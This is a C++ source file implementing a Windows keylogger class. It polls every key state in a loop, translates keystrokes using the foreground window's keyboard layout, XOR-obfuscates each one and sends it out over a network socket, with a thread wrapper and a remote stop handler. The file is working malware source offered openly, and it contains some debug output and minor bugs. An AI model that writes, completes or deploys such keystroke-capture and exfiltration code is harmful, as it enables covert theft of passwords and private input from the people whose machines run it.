
#include "../inc/Keylogger.h"
#include "../inc/other.h"

Keylogger::Keylogger(SOCKET &sock)
{
    a_sock = sock;;
    wcout << "SOCK: " << a_sock << endl;
    setup();
}


VOID Keylogger::setup()
{
    DWORD dwProcessId;
    a_WindowHandle =  GetForegroundWindow(); //Récupère un handle vers la fenêtre de premier plan
    a_dwThreadId = GetWindowThreadProcessId(a_WindowHandle, &dwProcessId); //Récupère l'identifiant du thread qui a créé la fenêtre spécifiée
    a_hkl = GetKeyboardLayout(a_dwThreadId); //Récupère l'identificateur de paramètres régionaux d'entrée actif (anciennement appelé disposition du clavier).
}


wstring Keylogger::specialKey(INT &keystroke)
{
    switch(keystroke)
    {
    //http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
    case VK_SPACE:
        return L" ";
        
    case VK_SHIFT:
        return L"[SHIFT]";
                                                    
    case VK_RETURN:
        return L"[ENTER]";
        
    case VK_BACK:
        return L"[BACKSPACE]";
        
    case VK_TAB:
        return L"[TAB]";
        
    case VK_CONTROL:
        return L"[CTRL]";
            
    case VK_DELETE:
        return L"[DEL]";
        
    case VK_OEM_1:
        return L"[;:]";
        
    case VK_OEM_2:
        return L"[/?]";
        
    case VK_OEM_3:
        return L"[`~]";
        
    case VK_OEM_4:
        return L"[ [{ ]";
            
    case VK_OEM_5:
        return L"[\\|]";
                                        
    case VK_OEM_6:
        return L"[ ]} ]";
        
    case VK_OEM_7:
        return L"['\"]";
        
    case VK_OEM_PLUS:
        return L"[=+]";
        
    case VK_OEM_COMMA:
        return L"[,<]";
        
    case VK_OEM_MINUS:
        return L"[-_]";
        
    case VK_OEM_PERIOD:
        return(L"[.>]");
        
    case VK_NUMPAD0:
        return L"0";
        
    case VK_NUMPAD1:
        return L"1";
        
    case VK_NUMPAD2:
        return L"2";
        
    case VK_NUMPAD3:
        return L"3";
        
    case VK_NUMPAD4:
        return L"4";
        
    case VK_NUMPAD5:
        return L"5";
        
    case VK_NUMPAD6:
        return L"6";
        
    case VK_NUMPAD7:
        return L"7";
        
    case VK_NUMPAD8:
        return L"8";
        
    case VK_NUMPAD9:
        return L"9";
        
    case VK_CAPITAL:
        return L"[CAPS LOCK]";
        
    case VK_PRIOR:
        return L"[PAGE UP]";
        
    case VK_NEXT:
        return L"[PAGE DOWN]";
        
    case VK_END:
        return L"[END]";
        
    case VK_HOME:
        return L"[HOME]";
        
    case VK_LWIN:
        return L"[WIN]";
        
    case VK_RWIN:
        return L"[WIN]";
        
    case VK_VOLUME_MUTE:
        return L"[SOUND-MUTE]";
        
    case VK_VOLUME_DOWN:
        return L"[SOUND-DOWN]";
        
    case VK_VOLUME_UP:
        return L"[SOUND-DOWN]";
        
    case VK_MEDIA_PLAY_PAUSE:
        return L"[MEDIA-PLAY/PAUSE]";
        
    case VK_MEDIA_STOP:
        return L"[MEDIA-STOP]";
        
    case VK_MENU:
        return L"[ALT]";
    
    default:
        return L""; //If the key and unknown or uninteresting 
    }
}


wstring Keylogger::intToUnicode(INT keystroke)
{
    BYTE kState[256]={0};
    WCHAR uni_key[16]={0};

    GetKeyboardState(kState); //Copie l'état des 256 clés virtuelles dans le tampon spécifié.

    UINT virtual_key = keystroke;

    ToUnicodeEx(virtual_key, keystroke, kState, uni_key, 32, 0, a_hkl);

    return (wstring) uni_key;
}


struct Keylogger::PARAMETERS
{
    SOCKET sock;
};


 DWORD WINAPI Keylogger::StaticThreadStart(LPVOID param) //https://stackoverflow.com/questions/8994224/efficiently-passing-parameters-to-function-in-another-thread-in-c
{
   
    PARAMETERS* params = (PARAMETERS*)param;
    
    wcout << "StaticThreadStart: " << params->sock << endl; 

    Keylogger keylogger(params->sock);
    keylogger.directTcp();
  
    return 0;
}


HANDLE Keylogger::startThread()
{
    wcout << "In startThread " << endl;

    DWORD dwThreadID;
    PARAMETERS *params = new PARAMETERS;  //I have to go through a structure to allow the socket to be initialized.  
    params->sock =a_sock;

    wcout << "starthread: " << params->sock << endl;
    HANDLE thread_handler_keylogger = CreateThread(NULL, 0,  StaticThreadStart, params, 0 ,&dwThreadID); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
    return thread_handler_keylogger;
}


VOID Keylogger::directTcp()
{   
    wcout << "goooo" <<endl;

    wstring unicode_char;
    while (true)
    {
        Sleep(10);
        for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
        {
            if(GetAsyncKeyState(keystroke) == -32767)
            {
                cout << keystroke << endl;
                if((keystroke>=39)&&(keystroke<91))
                {
                    //not SpecialKey
                    unicode_char = intToUnicode(keystroke);
                }
                else
                {
                    unicode_char = specialKey(keystroke);
                }

                wcout << "send char: "<<unicode_char << endl;
                wcout << "len: " << unicode_char.length() << endl;
                wcout << "sock: " << a_sock << endl;
                int stattt = send(a_sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
                wcout << "realy ????: " << stattt << endl;
            }
        }
    }
}


VOID Keylogger::waitingEndSession(HANDLE &thread_to_finish)//waits to receive an end-of-connection message  for directTcp
{
    WCHAR buff[512]={0};
    while(TRUE)
    {
        int stat = recv(a_sock, (CHAR *)buff, sizeof(buff), 0);
        if(stat == SOCKET_ERROR)
        {
            wcout << "SOCKET_ERROR" << endl;
            break;
        }
        else if (buff == L"\r\n")
        {
            wcout << "stop waitingEndSession" << endl;
            break;
        }
        wcout << buff << endl;

        ZeroMemory(&buff, sizeof(buff));
        wcout << "reset buff" << endl;

    }
    DWORD exitCode;
    wcout << "stop thread baby !" << endl;
    TerminateThread(thread_to_finish, exitCode);
    wcout << "exit code: " << exitCode << endl; 
}

Keylogger::~Keylogger()
{;}

//----------------------------------------------------------------------------------